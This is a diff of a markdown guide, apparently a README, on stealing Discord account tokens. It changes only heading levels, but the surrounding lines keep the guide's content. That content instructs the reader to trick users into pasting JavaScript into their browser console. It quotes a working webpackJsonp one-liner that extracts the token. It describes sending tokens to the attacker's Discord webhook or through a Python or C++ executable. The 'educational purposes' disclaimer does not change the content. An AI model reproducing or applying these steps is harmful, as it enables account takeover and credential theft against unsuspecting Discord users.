@@ -14,10 +14,10 @@ THIS IS STRICTLY FOR EDUCATIONAL PURPOSES AND THE KNOWLEDGE SHOULD NOT BE USED I
 
 ---
 
-### Grabbing the token
+## Grabbing the token
 Our first step is to obtain the discord token. This can be done through a C++ program compiled into exe, Python program (may be in exe), or JavaScript injection in the console of discord web version. 
 
-- Method 1: Get user to send you the token or get it yourself (JavaScript)
+### Method 1: Get user to send you the token or get it yourself (JavaScript)
 
 Get user to copy and paste this code into browser and send you back the token. Token will be alerted in window and logged in console. 
 
@@ -34,7 +34,7 @@ Alternative codes, follow the same steps as above.
 
 ```Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken()```
 
-- Method 2: Get user to run code and token will be sent to you (JavaScript)
+### Method 2: Get user to run code and token will be sent to you (JavaScript)
 
 Get user to copy and paste this code into browser and token will be automatically sent back to you via discord webhook. Replace ```YOUR DISCORD WEBHOOK HERE``` with your discord webhook URL.
 
@@ -76,7 +76,7 @@ How to set up your discord webhook:
 
 ![](https://i.imgur.com/8AnneNZ.png)
 
-- Method 3: Get user to run code and token will be sent to you (Python/C++)
+### Method 3: Get user to run code and token will be sent to you (Python/C++)
 
 Get user to run python code OR exe file and token will be automatically sent back to you via discord webhook. 
 
